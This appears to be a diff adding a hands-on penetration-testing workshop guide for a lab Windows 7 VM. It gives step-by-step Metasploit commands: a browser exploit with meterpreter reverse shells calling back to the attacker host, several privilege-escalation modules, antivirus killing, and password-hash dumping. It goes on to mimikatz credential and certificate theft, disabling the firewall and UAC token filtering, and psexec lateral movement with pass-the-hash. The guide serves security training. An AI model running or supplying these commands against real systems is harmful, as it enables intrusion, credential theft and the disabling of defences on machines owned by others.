@@ -1,0 +1,339 @@
+###########################
+# Download the victim VMs #
+###########################
+
+- Strategic Security Ubuntu Virtual Machine
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
+user: strategicsec
+pass: strategicsec
+ 
+
+- Windows 7 Virtual Machine
+https://s3.amazonaws.com/StrategicSec-VMs/Windows7.zip
+user: workshop
+pass: password
+ 
+ 
+
+########################################
+# Boot up the StrategicSec Ubuntu host #
+# You can also boot up the Win7 as well#
+########################################
+ 
+- Log in to your Ubuntu host with the following credentials:
+        user: strategicsec
+        pass: strategicsec
+ 
+ 
+ 
+- I prefer to use Putty to SSH into my Ubuntu host on pentests and I'll be teaching this class in the same manner that I do pentests.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+ 
+- For the purpose of this workshop my Win7 VM IP address is: Win7-Victim-IP so anytime you see that IP you'll know that's my Win7 VM
+- StrategicSec-VM-IP is my Ubuntu IP address so anytime you see that IP you'll know that's my Ubuntu host
+ 
+- Type the following commands
+sudo /sbin/iptables -F
+        strategicsec
+ 
+cd ~/toolz/metasploit
+ 
+
+#######################
+# Attacking Windows 7 #
+#######################
+
+
+sudo /sbin/iptables -F
+	strategicsec
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use exploit/windows/browser/ie_cgenericelement_uaf
+ 
+set ExitOnSession false
+ 
+set URIPATH /ie8
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST StrategicSec-VM-IP                                            
+ 
+exploit -j
+ 
+ 
+- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
+- given to you by metasploit.
+ 
+- The address will be something like:
+ 
+http://StrategicSec-VM-IP:8080/ie8                                            
+ 
+ 
+ 
+- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+- You can list the active sessions by typing:
+ 
+sessions -l
+ 
+ 
+ 
+ 
+- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
+ 
+ 
+sessions -i 1
+ 
+ 
+ 
+ 
+ 
+- You should now see Metasploit's meterpreter prompt.
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+ 
+meterpreter> run get_local_subnets
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+meterpreter> use priv
+ 
+ 
+--Option 1: GetSystem
+meterpreter> getsystem
+ 
+--Option 2:
+meterpreter > run post/windows/escalate/getsystem
+ 
+--Option 3:
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 1234
+exploit
+ 
+--Option 4:
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 12345
+exploit
+ 
+--Option 5:
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 5555
+exploit
+ 
+--Option 6:
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 4567
+exploit
+ 
+ 
+--Option 7:
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7777
+exploit
+ 
+--Option 8:
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7788
+exploit
+ 
+ 
+--Option 9:
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+--------------------------------------------------------
+ 
+meterpreter> run killav
+ 
+meterpreter> run post/windows/gather/hashdump       (you'll see that it fails)
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+
+
+meterpreter> run post/windows/gather/hashdump       (you'll see that it works now that you migrated into a SYSTEM level process)
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+ 
+meterpreter > run getcountermeasure
+ 
+meterpreter> run winenum
+ 
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+ 
+ 
+********************************** FIX PSEXEC **********************************
+ 
+- We use the shell command to get to the Victim Dos command so we can add a registry field.
+ 
+meterpreter > execute -c -H -f cmd -a "/k" -i
+reg /?
+ 
+ 
+- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
+ 
+C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
+
+
+c:\Windows\system32> netsh advfirewall set profiles state off
+
+********************************** Lateral Movement *******************************
+
+
+Now we can run the PSEXEC exploit.
+-- Option 1:
+use exploit/windows/smb/psexec
+
+set SMBUser Workshop
+ 
+set SMBPass password
+ 
+set RHOST Win7-Victim-IP
+
+set payload windows/meterpreter/reverse_tcp
+ 
+set LHOST StrategicSec-VM-IP
+ 
+set LPORT 2345
+ 
+exploit
+ 
+ 
+ 
+ 
+-- Option 2:
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set RHOST Win7-Victim-IP                      
+ 
+set LHOST StrategicSec-VM-IP
+ 
+set LPORT 5678
+ 
+exploit
